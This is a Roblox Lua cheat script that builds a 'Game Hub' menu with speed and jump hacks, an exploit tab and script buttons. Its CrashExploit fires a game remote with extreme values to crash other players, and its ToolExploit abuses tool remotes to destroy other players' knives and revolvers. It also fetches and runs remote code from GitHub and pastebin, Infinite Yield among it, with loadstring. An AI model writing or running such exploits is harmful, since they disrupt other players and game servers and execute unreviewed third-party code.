local lib = loadstring(game:HttpGet('https://raw.githubusercontent.com/TheoTheEpic/AquaLib/main/AquaLib.lua'))()

local window = lib.createWindow("Game Hub", "MainHub", true) -- Create the main window

-- Player Tab
local playerTab = window.createTab("Player Hacks")

local playerSection = playerTab.createSection("Player Enhancements", false)

playerSection.createSlider("Walkspeed", {defualt = 16, max = 100, min = 16}, function(value)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = value
end)

playerSection.createSlider("Jumppower", {defualt = 50, max = 200, min = 50}, function(value)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = value
end)

playerSection.createToggle("Noclip", false, function(state)
    if state then
    end
end)

playerSection.createToggle("InfJump", false, function(state)
    infJumpEnabled = state
end)

playerSection.createToggle("Xray", false, function(state)
    xrayEnabled = state
end)

-- Exploit Tab
local exploitTab = window.createTab("Exploits")

local exploitSection = exploitTab.createSection("Player Exploits", false)

exploitSection.createToggle("CrashExploit", false, function(state)
    if state then
        local dice = game.Players.LocalPlayer.Backpack:FindFirstChild("Dice") or game.Players.LocalPlayer.Character:FindFirstChild("Dice")
        if not dice then
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Failed!",
                Text = "Something went wrong!",
                Duration = 3
            })
            return
        end

        for i = 1, 2 do
            game.ReplicatedStorage.GameEvents.Misk.ReplicateGearEffect:FireServer({
                { Character = game.Players.LocalPlayer.Character, GearModel = dice, Start = Vector3.new(2^8, 0, 0), Target = Vector3.new(0, 10014, 291) }
            })
        end

        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "CrashExploit",
            Text = "Crashed Players!",
            Duration = 3
        })
    end
end)

exploitSection.createToggle("ToolExploit", false, function(state)
    if state then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Success!",
            Text = "Removed Tools",
            Duration = 3
        })

        wait(0.01)

        for _, player in ipairs(game.Players:GetPlayers()) do
            if player ~= game.Players.LocalPlayer then
                for _, tool in ipairs(player.Character:GetChildren()) do
                    if tool:IsA("Tool") and (tool.Name == "Knife" or tool.Name == "Revolver") then
                        tool.ClientEvent:FireServer("ConfirmDestruction", {})
                    end
                end

                for _, tool in ipairs(player.Backpack:GetChildren()) do
                    if tool:IsA("Tool") and (tool.Name == "Knife" or tool.Name == "Revolver") then
                        tool.ClientEvent:FireServer("ConfirmDestruction", {})
                    end
                end
            end
        end
    end
end)
-- Scripts Tab
local scriptsTab = window.createTab("Scripts")
local KATSection = scriptsTab.createSection("KAT Scripts", false)

KATSection.createButton("KAT Script", function()
    window.notification("Scripts", "Executed Script!")
    loadstring(game:HttpGet(('https://pastebin.com/raw/6G9GfqjC'),true))()
end)
KATSection.createButton("Infinite Yield", function()
    window.notification("Scripts", "Executed Script!")
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)
